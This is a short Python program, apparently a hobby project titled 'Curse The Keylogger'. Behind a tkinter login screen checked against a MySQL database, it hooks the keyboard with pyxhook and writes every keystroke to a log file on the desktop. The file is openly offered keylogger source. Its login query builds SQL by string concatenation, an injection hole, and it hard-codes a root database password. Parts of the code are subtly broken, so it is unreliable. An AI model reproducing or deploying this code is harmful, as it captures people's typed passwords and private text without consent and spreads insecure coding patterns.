import tkinter
from tkinter import *
from tkinter import messagebox
import os
import pyxhook
import pymysql
import time

keylogger=tkinter.Tk()
keylogger.geometry("500x350")
keylogger.title(" keylogger")



try:
    # Open database connection
    db = pymysql.connect("localhost", "root", "Admin@123", "mydb")
    print("connected to database")
    cursor = db.cursor()


except Exception as e:
    print("error in database", e)


def show_entry_fields():
    sql = "SELECT * FROM login WHERE name ='"+e1.get()+"' AND password='"+e2.get()+"'"
    print(sql)
    cursor.execute(sql)
    myresult = cursor.fetchall()
    if len(myresult)>0:
        print("login successful")
        w = Message(keylogger, text="Script has been stated,bonne journée", width=50)
        logger()

    else:
        print("login failed")
        w = Message(keylogger, text="Sorry you have entered wrong information ", width=50)


c=tkinter.Label(keylogger,text="Curse The Keylogger \n ", bg="orange", pady=20)
c.pack(fill="x")



c=tkinter.Label(keylogger,text="~Coded by Sourabh", bg="orange")
c.pack(fill="x", pady=20)


d=tkinter.Label(keylogger, text="UserName")
d.pack(pady=5)

e1=tkinter.Entry(keylogger, borderwidth=3)

e1.pack(pady=5)

f=tkinter.Label(keylogger, text="Password")

f.pack(pady=5)
e2=tkinter.Entry(keylogger,borderwidth=3, relief="sunken")

e2.pack(pady=5)

#print(e1)
#print(e2)



g=tkinter.Button(keylogger, text="Start Trapping", bg="silver",borderwidth=3, relief="groove", command = show_entry_fields)
g.pack(pady=5)
w = Message(keylogger, text="Script has been stated,bonne journée", width=50)


def logger():

        log_file = os.environ.get('mylogger', os.path.expanduser("~/Desktop/file.log"))

           # onkeypress function is called everytime a key is pressed.
        def OnKeyPress(event):
            fob = open(log_file, 'a')
            fob.write(event.Key)
            fob.write('\n')

            if event.Ascii == 96:  # 96  ascii - grave key
                fob.close()
                new_hook.cancel()

        # start HookManager class
        new_hook = pyxhook.HookManager()
        # listen to all keystrokes
        new_hook.KeyDown =OnKeyPress
        # hook the keyboard
        new_hook.HookKeyboard()
        # start the session
        new_hook.start


keylogger.mainloop()
